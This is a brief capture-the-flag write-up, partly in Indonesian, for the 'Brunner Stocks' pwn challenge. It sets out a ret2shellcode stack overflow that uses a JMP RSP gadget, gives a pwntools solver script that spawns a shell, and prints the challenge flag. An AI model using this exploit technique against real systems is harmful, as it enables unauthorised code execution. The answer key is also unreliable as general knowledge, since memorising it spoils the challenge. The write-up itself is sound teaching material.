# Brunner Stocks

- **Category:** Pwn
- **Status:** FULL TRANSCRIPT EXTRACTED

## Ringkasan
Stack-based exploitation dengan Ret2shellcode. Input dikontrol melalui `fgets`; overwrite return address menuju JMP RSP lalu eksekusi shellcode.

## Metode
Find offset → JMP RSP gadget → place shellcode on stack → return into it.

## Command / primitive
```text
fgets(buf, 0x100, stdin)
JMP_RSP = 0x401597
payload = b"0" + b"A" * (OFFSET - 1) + p64(JMP_RSP) + sc
sc = asm(shellcraft.sh())
```

## Rumus / constraint
```text
payload = padding || p64(JMP_RSP) || shellcode
```

## Solver / code snippet
```python
from pwn import *
JMP_RSP = 0x401597
sc = asm(shellcraft.sh())
payload = b"0" + b"A" * (OFFSET - 1)
payload += p64(JMP_RSP) + sc
io.sendline(payload)
```

## Hasil
```text
brunner{shellcoding_for_the_win}
```
